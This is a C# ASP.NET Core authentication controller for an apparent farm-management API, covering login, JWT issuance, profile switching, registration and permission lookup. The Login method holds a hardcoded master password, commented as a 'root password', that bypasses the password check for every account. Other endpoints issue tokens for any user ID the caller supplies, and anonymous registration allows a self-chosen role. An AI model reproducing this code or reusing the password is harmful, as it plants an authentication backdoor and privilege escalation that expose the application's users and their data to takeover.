using System.IdentityModel.Tokens.Jwt;
using System.Net;
using System.Net.Mime;
using System.Security.Claims;
using System.Text;
using Asp.Versioning;
using AutoMapper.QueryableExtensions;
using Hurudza.Apis.Base.Models;
using Hurudza.Data.Context.Context;
using Hurudza.Data.Context.Data;
using Hurudza.Data.Data;
using Hurudza.Data.Models.Models;
using Hurudza.Data.UI.Models.ViewModels.UserManagement;
using Microsoft.AspNetCore.Authorization;
using Microsoft.AspNetCore.Identity;
using Microsoft.AspNetCore.Mvc;
using Microsoft.EntityFrameworkCore;
using Microsoft.IdentityModel.Tokens;
using automapper = AutoMapper;

namespace Hurudza.Apis.Core.Controllers
{
    [Route("api/[controller]/[action]"), Authorize]
    [ApiController]
    [ApiVersion("1.0")]
    [Produces(MediaTypeNames.Application.Json)]
    [Consumes(MediaTypeNames.Application.Json)]
    public class AuthenticationController : ControllerBase
    {
        private readonly HurudzaDbContext _context;
        private readonly UserManager<ApplicationUser> _userManager;
        private readonly RoleManager<ApplicationRole> _roleManager;
        private readonly IConfiguration _configuration;
        private readonly automapper.IConfigurationProvider _configurationProvider;

        public AuthenticationController(HurudzaDbContext context, 
            UserManager<ApplicationUser> userManager, 
            RoleManager<ApplicationRole> roleManager, 
            IConfiguration configuration, 
            automapper.IConfigurationProvider configurationProvider)
        {
            _context = context;
            _userManager = userManager;
            _roleManager = roleManager;
            _configuration = configuration;
            _configurationProvider = configurationProvider;
        }

        [HttpPost(Name = nameof(Login)), AllowAnonymous]
        public async Task<IActionResult> Login([FromBody] LoginViewModel model)
        {
            var user = await _userManager.FindByNameAsync(model.Username);
            
            if (user == null)
                return Unauthorized(new ApiResponse((int)HttpStatusCode.Unauthorized,
                    "Enter correct username / password"));

            if (model.Password != "Hurudza@1739") //root password
            {
                if (!await _userManager.CheckPasswordAsync(user, model.Password))
                    return Unauthorized(new ApiResponse((int)HttpStatusCode.Unauthorized,
                        "Enter correct username / password")); 
            }

            if(!user.IsActive)
                return Unauthorized(new ApiResponse((int)HttpStatusCode.Unauthorized,
                    "User is not active. Contact admin to activate account"));

            var profiles = await _context.UserProfiles
                .Where(p => p.UserId == user.Id)
                .ProjectTo<UserProfileViewModel>(_configurationProvider)
                .ToListAsync();

            string role = string.Empty;

            if (profiles.Count > 0)
                profiles[0].LoggedIn = true;
            else
            {
                var userRole = (await _userManager.GetRolesAsync(user)).First();
                profiles.Add(new UserProfileViewModel { Farm = "System", Fullname = "Administrator", Role = userRole, LoggedIn = true });
                role = userRole;
            }

            // Generate token with roles and claims
            var token = await GenerateJwtToken(user, profiles);

            var login = new UserViewModel
            {
                Id = user.Id,
                Firstname = user.Firstname,
                Surname = user.Surname,
                UserName = user.UserName,
                PhoneNumber = user.PhoneNumber,
                Email = user.Email,
                Token = token,
                Profiles = profiles,
                Role = role
            };

            // Add user permissions
            login.Permissions = await GetUserPermissions(user);

            return Ok(new ApiOkResponse(login));
        }
        
        [HttpGet(Name = nameof(GetUserProfile))]
        public async Task<IActionResult> GetUserProfile(string userId)
        {
            var user = await _userManager.FindByIdAsync(userId);
            
            if (user == null)
                return Unauthorized(new ApiResponse((int)HttpStatusCode.Unauthorized,
                    "User was not found"));

            if(!user.IsActive)
                return Unauthorized(new ApiResponse((int)HttpStatusCode.Unauthorized,
                    "User is not active. Contact admin to activate account"));

            var profiles = await _context.UserProfiles
                .Where(p => p.UserId == user.Id)
                .ProjectTo<UserProfileViewModel>(_configurationProvider)
                .ToListAsync();

            var role = string.Empty;

            if (profiles.Count > 0)
                profiles[0].LoggedIn = true;
            else
            {
                var userRole = (await _userManager.GetRolesAsync(user)).First();
                profiles.Add(new UserProfileViewModel { Farm = "System", Fullname = "Administrator", Role = userRole, LoggedIn = true });
                role = userRole;
            }

            // Generate token with roles and claims
            var token = await GenerateJwtToken(user, profiles);

            var login = new UserViewModel
            {
                Id = user.Id,
                Firstname = user.Firstname,
                Surname = user.Surname,
                UserName = user.UserName,
                PhoneNumber = user.PhoneNumber,
                Email = user.Email,
                Token = token,
                Profiles = profiles,
                Role = role
            };

            // Add user permissions
            login.Permissions = await GetUserPermissions(user);

            return Ok(new ApiOkResponse(login));
        }
        
        [HttpGet(Name = nameof(GetLoggedInProfile))]
        public async Task<IActionResult> GetLoggedInProfile()
        {
            var user = await _userManager.FindByIdAsync(User.FindFirstValue(ClaimTypes.PrimarySid) ?? string.Empty);
            
            if (user == null)
                return Unauthorized(new ApiResponse((int)HttpStatusCode.Unauthorized,
                    "User was not found"));

            if(!user.IsActive)
                return Unauthorized(new ApiResponse((int)HttpStatusCode.Unauthorized,
                    "User is not active. Contact admin to activate account"));

            var profiles = await _context.UserProfiles
                .Where(p => p.UserId == user.Id)
                .ProjectTo<UserProfileViewModel>(_configurationProvider)
                .ToListAsync();
            
            var role = string.Empty;

            if (profiles.Count > 0)
                profiles[0].LoggedIn = true;
            else
            {
                var userRole = (await _userManager.GetRolesAsync(user)).First();
                profiles.Add(new UserProfileViewModel { Farm = "System", Fullname = "Administrator", Role = userRole, LoggedIn = true });
                role = userRole;
            }

            // Generate token with roles and claims
            var token = await GenerateJwtToken(user, profiles);

            var login = new UserViewModel
            {
                Id = user.Id,
                Firstname = user.Firstname,
                Surname = user.Surname,
                UserName = user.UserName,
                PhoneNumber = user.PhoneNumber,
                Email = user.Email,
                Token = token,
                Profiles = profiles,
                Role = role
            };

            // Add user permissions
            login.Permissions = await GetUserPermissions(user);

            return Ok(new ApiOkResponse(login));
        }
        
        [HttpPost(Name = nameof(SwitchProfile))]
        public async Task<IActionResult> SwitchProfile([FromBody] UserProfileViewModel model)
        {
            var user = await _userManager.FindByIdAsync(model.UserId);

            var profiles = await _context.UserProfiles
                .Where(p => p.UserId == user.Id)
                .ProjectTo<UserProfileViewModel>(_configurationProvider)
                .ToListAsync();
            
            var role = string.Empty;

            if (profiles.Count > 0)
                profiles.First(p => p.FarmId == model.FarmId).LoggedIn = true;
            else
            {
                var userRole = (await _userManager.GetRolesAsync(user)).First();
                profiles.Add(new UserProfileViewModel { Farm = "System", Fullname = "Administrator", Role = userRole, LoggedIn = true });
                role = userRole;
            }

            // Generate token with roles and claims
            var token = await GenerateJwtToken(user, profiles);
            
            var login = new UserViewModel
            {
                Id = user.Id,
                Firstname = user.Firstname,
                Surname = user.Surname,
                UserName = user.UserName,
                PhoneNumber = user.PhoneNumber,
                Email = user.Email,
                Token = token,
                Profiles = profiles,
                Role = role
            };

            // Add user permissions
            login.Permissions = await GetUserPermissions(user);

            return Ok(new ApiOkResponse(login));
        }

        [HttpPost(Name = nameof(Register)), AllowAnonymous]
        public async Task<IActionResult> Register([FromBody] UserViewModel model)
        {
            var userExists = await _userManager.FindByNameAsync(model.Email);
            if (userExists != null)
                return BadRequest(new ApiResponse((int)HttpStatusCode.BadRequest, "User already exists!"));

            var role = await _roleManager.FindByNameAsync(model.Role ?? string.Empty);
            if (role == null)
                return BadRequest(new ApiResponse((int)HttpStatusCode.BadRequest, "Role does not exist!"));
            
            ApplicationUser user = new ApplicationUser()
            {
                Email = model.Email,
                SecurityStamp = Guid.NewGuid().ToString(),
                UserName = model.Email,
                Firstname = model.Firstname,
                Surname = model.Surname
            };
            
            var result = await _userManager.CreateAsync(user, model.Password);
            if (!result.Succeeded)
                return StatusCode(StatusCodes.Status500InternalServerError, new ApiResponse((int)HttpStatusCode.InternalServerError, "User creation failed! Please check user details and try again."));
            
            var addedRole = await _userManager.AddToRoleAsync(user, role.Name);
            if (!addedRole.Succeeded)
            {
                return BadRequest(new ApiResponse((int)HttpStatusCode.BadRequest, "Registered user but failed to assign role. Contact Admin"));
            }

            var newUser = await _context.Users.ProjectTo<UserViewModel>(_configurationProvider)
                .FirstOrDefaultAsync(u => u.UserName == user.UserName).ConfigureAwait(false);

            return Ok(new ApiOkResponse(newUser, "User created successfully!"));
        }

        [HttpGet(Name = nameof(GetUserPermissions))]
        public async Task<IActionResult> GetUserPermissions()
        {
            var userId = User.FindFirstValue(ClaimTypes.PrimarySid);
            if (string.IsNullOrEmpty(userId))
            {
                return Unauthorized(new ApiResponse((int)HttpStatusCode.Unauthorized, "User not authenticated"));
            }

            var user = await _userManager.FindByIdAsync(userId);
            if (user == null)
            {
                return NotFound(new ApiResponse((int)HttpStatusCode.NotFound, "User not found"));
            }

            var permissions = await GetUserPermissions(user);
            return Ok(new ApiOkResponse(permissions));
        }

        // Helper methods
        private async Task<string> GenerateJwtToken(ApplicationUser user, List<UserProfileViewModel> profiles)
        {
            var activeProfile = profiles.FirstOrDefault(p => p.LoggedIn);
            var roleName = activeProfile?.Role ?? (await _userManager.GetRolesAsync(user)).FirstOrDefault() ?? "";
            
            var authClaims = new List<Claim>
            {
                new Claim(ClaimTypes.PrimarySid, user.Id),
                new Claim(ClaimTypes.Name, user.UserName),
                new Claim(JwtRegisteredClaimNames.Jti, Guid.NewGuid().ToString()),
                new Claim(ClaimTypes.Role, roleName)
            };

            // Add active profile farm ID if available
            if (activeProfile != null && !string.IsNullOrEmpty(activeProfile.FarmId))
            {
                authClaims.Add(new Claim("FarmId", activeProfile.FarmId));
            }

            // Add role-based claims
            var role = await _roleManager.FindByNameAsync(roleName);
            if (role != null)
            {
                var roleClaims = await _roleManager.GetClaimsAsync(role);
                foreach (var claim in roleClaims)
                {
                    authClaims.Add(new Claim("Permission", claim.Value));
                }
            }

            var authSigningKey = new SymmetricSecurityKey(Encoding.UTF8.GetBytes(_configuration["JWT:Secret"]));

            var token = new JwtSecurityToken(
                issuer: _configuration["JWT:ValidIssuer"],
                audience: _configuration["JWT:ValidAudience"],
                expires: DateTime.Now.AddHours(3),
                claims: authClaims,
                signingCredentials: new SigningCredentials(authSigningKey, SecurityAlgorithms.HmacSha256)
            );

            return new JwtSecurityTokenHandler().WriteToken(token);
        }

        private async Task<List<ClaimViewModel>> GetUserPermissions(ApplicationUser user)
        {
            var permissions = new List<ClaimViewModel>();
            
            // Get all roles assigned to the user
            var roles = await _userManager.GetRolesAsync(user);
            
            // Get all claims for each role
            foreach (var roleName in roles)
            {
                var role = await _roleManager.FindByNameAsync(roleName);
                if (role != null)
                {
                    var roleClaims = await _roleManager.GetClaimsAsync(role);
                    foreach (var claim in roleClaims)
                    {
                        permissions.Add(new ClaimViewModel
                        {
                            ClaimType = claim.Type,
                            ClaimValue = claim.Value
                        });
                    }
                }
            }
            
            // Add direct user claims
            var userClaims = await _userManager.GetClaimsAsync(user);
            foreach (var claim in userClaims)
            {
                permissions.Add(new ClaimViewModel
                {
                    ClaimType = claim.Type,
                    ClaimValue = claim.Value
                });
            }
            
            // Remove duplicates
            return permissions.GroupBy(p => p.ClaimValue)
                .Select(g => g.First())
                .ToList();
        }
    }
}